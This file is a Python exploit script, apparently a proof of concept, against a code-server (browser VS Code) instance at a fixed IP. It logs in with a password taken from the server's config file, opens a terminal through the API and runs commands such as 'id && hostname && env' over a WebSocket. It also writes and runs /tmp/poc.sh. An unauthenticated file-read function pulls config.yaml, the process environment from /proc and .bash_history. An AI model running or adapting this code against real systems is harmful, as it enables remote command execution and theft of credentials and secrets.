import requests
import websocket
import json
import time
import threading
import urllib3

urllib3.disable_warnings()

# ============================================================
# CONFIG — fill these in after reading config.yaml
# ============================================================
VSCODE_HOST  = "198.18.116.130"   # target VS Code IP
VSCODE_PORT  = 8081               # port from scan
PASSWORD     = "d6876891639c7863f2449b37"  # from config.yaml
COMMAND      = "id && hostname && env "

# ============================================================
# Step 1 — Authenticate and get session cookie
# ============================================================
def get_session_cookie(host, port, password):
    session = requests.Session()
    base = f"http://{host}:{port}"
    
    # code-server login endpoint
    r = session.post(
        f"{base}/login",
        data={"password": password},
        allow_redirects=True,
        verify=False,
        timeout=5
    )
    print(f"Login status: {r.status_code}")
    print(f"Cookies: {dict(session.cookies)}")
    
    # Extract session cookie
    cookie = session.cookies.get("session") or \
             session.cookies.get("key") or \
             "; ".join([f"{k}={v}" for k,v in session.cookies.items()])
    
    print(f"Session cookie: {cookie[:80] if cookie else 'NOT FOUND'}")
    return session, cookie, base

session, cookie, base = get_session_cookie(
    VSCODE_HOST, VSCODE_PORT, PASSWORD
)

# ============================================================
# Step 2 — Create a terminal via the API
# ============================================================
def create_terminal(session, base, cookie):
    # code-server creates terminals via this endpoint
    r = session.post(
        f"{base}/api/v0/terminal",
        json={"cols": 220, "rows": 50},
        headers={
            "Cookie": cookie,
            "Content-Type": "application/json",
        },
        verify=False,
        timeout=5
    )
    print(f"\nCreate terminal: {r.status_code}")
    print(f"Response: {r.text[:200]}")
    
    if r.status_code == 200:
        data = r.json()
        term_id = data.get("id") or data.get("pid") or data.get("terminalId")
        print(f"Terminal ID: {term_id}")
        return term_id
    return None

term_id = create_terminal(session, base, cookie)

# ============================================================
# Step 3 — Connect via WebSocket and send command
# ============================================================
def run_command_via_terminal(host, port, cookie, term_id, command):
    output = []
    done   = threading.Event()
    
    # WebSocket URL for terminal
    ws_url = f"ws://{host}:{port}/api/v0/terminal/{term_id}"
    print(f"\nConnecting to: {ws_url}")
    
    def on_message(ws, message):
        if isinstance(message, bytes):
            text = message.decode("utf-8", errors="replace")
        else:
            text = message
        output.append(text)
        print(f"OUTPUT: {repr(text)}")
        
        # Stop after getting output
        if "$" in text or "#" in text:
            if len(output) > 2:
                done.set()
    
    def on_open(ws):
        print("WebSocket connected!")
        time.sleep(0.5)
        # Send command followed by newline
        ws.send(f"{command}\n")
        time.sleep(2)
        # Send exit to close terminal cleanly
        ws.send("exit\n")
    
    def on_error(ws, error):
        print(f"WS Error: {error}")
        done.set()
    
    def on_close(ws, *args):
        print("WS Closed")
        done.set()
    
    ws = websocket.WebSocketApp(
        ws_url,
        header={"Cookie": cookie},
        on_message=on_message,
        on_open=on_open,
        on_error=on_error,
        on_close=on_close,
    )
    
    t = threading.Thread(target=ws.run_forever,
                        kwargs={"sslopt": {"cert_reqs": 0}})
    t.daemon = True
    t.start()
    
    done.wait(timeout=15)
    ws.close()
    
    return "".join(output)

# ============================================================
# Step 4 — Run and collect output
# ============================================================
if term_id:
    result = run_command_via_terminal(
        VSCODE_HOST, VSCODE_PORT, cookie, term_id, COMMAND
    )
    print(f"\n=== FINAL OUTPUT ===\n{result}")
else:
    print("No terminal ID — trying alternative approach")
    
    # ============================================================
    # Alternative — some code-server versions use /terminal
    # without needing to create first
    # ============================================================
    print("\n=== Trying direct WebSocket terminal ===")
    
    output = []
    done   = threading.Event()
    
    def on_message(ws, msg):
        text = msg.decode() if isinstance(msg, bytes) else msg
        output.append(text)
        print(f"< {repr(text)}")
    
    def on_open(ws):
        time.sleep(1)
        ws.send(f"{COMMAND}\n")
        time.sleep(3)
        done.set()
    
    ws = websocket.WebSocketApp(
        f"ws://{VSCODE_HOST}:{VSCODE_PORT}/terminal",
        header={"Cookie": cookie},
        on_message=on_message,
        on_open=on_open,
    )
    
    t = threading.Thread(target=ws.run_forever,
                        kwargs={"sslopt": {"cert_reqs": 0}})
    t.daemon = True
    t.start()
    done.wait(timeout=10)
    ws.close()
    print("".join(output))
    
    
    
# Step A — Write a script to the pod
def vsc_write_and_run(session, base, cookie, command):
    
    # Write command to a temp script
    script = f"#!/bin/sh\n{command}\n"
    r = session.post(
        f"{base}/api/v0/write",
        json={
            "path":    "/tmp/poc.sh",
            "content": script,
        },
        headers={"Cookie": cookie},
        verify=False
    )
    print(f"Write script: {r.status_code}")
    
    # Execute it
    r = session.post(
        f"{base}/api/v0/exec",
        json={"command": "sh /tmp/poc.sh"},
        headers={"Cookie": cookie},
        verify=False
    )
    print(f"Exec: {r.status_code} {r.text[:300]}")
    return r.text

# Step B — Or just read files directly (already proven to work)
def vsc_read(host, port, path):
    r = requests.get(
        f"http://{host}:{port}/vscode-remote-resource",
        params={"path": path},
        timeout=5
    )
    return r.text

# Read the config.yaml to get the password
print(vsc_read(VSCODE_HOST, VSCODE_PORT,
               "/home/coder/.config/code-server/config.yaml"))

# Read env vars of the VS Code process
print(vsc_read(VSCODE_HOST, VSCODE_PORT,
               "/proc/61/environ").replace("\x00", "\n"))

# Read bash history
print(vsc_read(VSCODE_HOST, VSCODE_PORT,
               "/home/coder/.bash_history"))
